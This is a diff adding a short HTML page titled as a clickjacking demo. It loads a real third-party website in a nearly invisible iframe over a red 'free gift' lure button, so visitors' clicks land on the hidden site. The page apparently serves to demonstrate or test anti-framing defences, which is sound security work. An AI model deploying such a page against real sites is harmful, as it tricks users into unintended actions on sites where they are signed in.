@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Démo Clickjacking</title>
+  <style>
+    iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 800px;
+      height: 600px;
+      opacity: 0.01;
+      z-index: 999;
+    }
+    .fake-button {
+      position: relative;
+      z-index: 1;
+      padding: 20px;
+      background: red;
+      color: white;
+      font-size: 24px;
+      border: none;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <button class="fake-button">Clique ici pour recevoir un cadeau</button>
+  <iframe src="https://www.vademecum.es/"></iframe>
+</body>
+</html>
